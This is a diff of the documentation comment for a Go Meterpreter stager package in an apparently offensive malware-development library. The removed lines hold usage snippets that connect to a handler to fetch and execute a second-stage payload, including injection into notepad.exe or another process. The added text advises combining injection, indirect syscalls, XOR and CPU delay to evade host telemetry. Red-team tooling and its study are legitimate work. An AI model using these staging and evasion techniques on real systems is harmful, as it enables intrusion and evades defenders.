@@ -1,86 +1,55 @@
-// Package meterpreter implements Metasploit Framework staging functionality
-// for receiving and executing second-stage Meterpreter payloads.
+// Package meterpreter implements Metasploit Framework staging — pulls
+// a second-stage Meterpreter payload from a `multi/handler` and
+// executes it in the current process or a target picked via the
+// optional `Config.Injector`.
 //
-// Technique: Meterpreter stager connecting to Metasploit multi/handler.
-// MITRE ATT&CK: T1059 (Command and Scripting Interpreter), T1055 (Process Injection)
-// Platform: Cross-platform (Windows and Linux)
-// Detection: High -- Meterpreter staging is a well-known attack pattern;
-// network signatures exist for all transport types.
+// Three transport flavours are supplied:
 //
-// Supports three transport protocols:
-//   - TCP: direct reverse TCP connection
-//   - HTTP: reverse HTTP connection
-//   - HTTPS: reverse HTTPS with optional InsecureSkipVerify
+//   - `TCP` — raw reverse TCP.
+//   - `HTTP` — reverse HTTP with the Metasploit URI checksum format.
+//   - `HTTPS` — same with TLS, optionally `InsecureSkipVerify` for
+//     self-signed handlers.
 //
-// # Stage Execution
+// Stage execution defaults to a minimal self-injection
+// (`VirtualAlloc + RtlMoveMemory + VirtualProtect + CreateThread` on
+// Windows; `mmap + purego.SyscallN` on Linux). `Config.Injector` overrides
+// that path with any [inject.Injector], making the full
+// [github.com/oioio-space/maldev/inject] surface (Build, decorators,
+// syscall modes, automatic fallback) available for stage delivery.
 //
-// By default the stager uses a simple self-injection path:
-//   - Windows: VirtualAlloc + RtlMoveMemory + VirtualProtect + CreateThread
-//   - Linux: mmap + purego.SyscallN (System V AMD64 ABI)
+// On Linux `Config.Injector` is unsupported because the Meterpreter
+// wrapper protocol requires the live socket fd to receive the ELF
+// stage; setting it returns an error.
 //
-// Set Config.Injector to override stage execution with any inject.Injector.
-// This gives full access to the inject package's capabilities:
-//   - 10+ Windows injection methods (CRT, APC, EarlyBird, Fiber, ETW, etc.)
-//   - Builder pattern with fluent API: inject.Build().Method(...).Create()
-//   - Syscall routing: WinAPI, NativeAPI, Direct, Indirect syscalls
-//   - Decorator chain: WithXOR, WithCPUDelay, WithValidation
-//   - Automatic fallback on failure
+// # MITRE ATT&CK
 //
-// See inject.AvailableMethods() for the full list of methods.
+//   - T1059 (Command and Scripting Interpreter)
+//   - T1055 (Process Injection) — when `Config.Injector` is set
+//   - T1071.001 (Application Layer Protocol: Web Protocols) — HTTP/HTTPS variants
+//   - T1095 (Non-Application Layer Protocol) — TCP variant
 //
-// On Linux, Config.Injector is not supported because the Meterpreter wrapper
-// protocol requires the socket fd to read the ELF payload. An error is
-// returned if Injector is set on Linux.
+// # Detection level
 //
-// # Usage
+// noisy
 //
-// Default self-injection (simplest):
+// Meterpreter staging is a well-known attack pattern. Network
+// signatures match all three transport types out of the box on
+// Snort/Suricata; AV products fingerprint the Metasploit payload
+// stub even encrypted. Pair with `Config.Injector` (preferably
+// `MethodEarlyBirdAPC` + indirect syscalls + XOR + CPU delay) to
+// blunt the host-side telemetry.
 //
-//	cfg := &meterpreter.Config{
-//	    Transport: meterpreter.TCP,
-//	    Host:      "192.168.1.10",
-//	    Port:      "4444",
-//	    Timeout:   30 * time.Second,
-//	}
-//	stager := meterpreter.NewStager(cfg)
-//	err := stager.Stage(context.Background())
+// # Example
 //
-// With custom injector (EarlyBird APC + indirect syscalls + XOR evasion):
+// See [ExampleNewStager] and [ExampleStager_withInjector] in
+// meterpreter_example_test.go.
 //
-//	inj, _ := inject.Build().
-//	    Method(inject.MethodEarlyBirdAPC).
-//	    ProcessPath(`C:\Windows\System32\notepad.exe`).
-//	    IndirectSyscalls().
-//	    WithFallback().
-//	    Use(inject.WithXOR).
-//	    Use(inject.WithCPUDelay).
-//	    Create()
-//	cfg := &meterpreter.Config{
-//	    Transport: meterpreter.TCP,
-//	    Host:      "192.168.1.10",
-//	    Port:      "4444",
-//	    Timeout:   30 * time.Second,
-//	    Injector:  inj,
-//	}
-//	stager := meterpreter.NewStager(cfg)
-//	err := stager.Stage(context.Background())
+// # See also
 //
-// With remote injection into existing process:
+//   - docs/techniques/c2/meterpreter.md
+//   - [github.com/oioio-space/maldev/inject] — stage execution surface
+//   - [github.com/oioio-space/maldev/c2/transport] — generic transport layer
 //
-//	inj, _ := inject.Build().
-//	    Method(inject.MethodCreateRemoteThread).
-//	    TargetPID(1234).
-//	    IndirectSyscalls().
-//	    WithFallback().
-//	    Create()
-//	cfg := &meterpreter.Config{
-//	    Transport: meterpreter.HTTPS,
-//	    Host:      "192.168.1.10",
-//	    Port:      "8443",
-//	    Timeout:   30 * time.Second,
-//	    TLSInsecure: true,
-//	    Injector:  inj,
-//	}
-//	stager := meterpreter.NewStager(cfg)
-//	err := stager.Stage(context.Background())
+// [github.com/oioio-space/maldev/inject]: https://pkg.go.dev/github.com/oioio-space/maldev/inject
+// [github.com/oioio-space/maldev/c2/transport]: https://pkg.go.dev/github.com/oioio-space/maldev/c2/transport
 package meterpreter
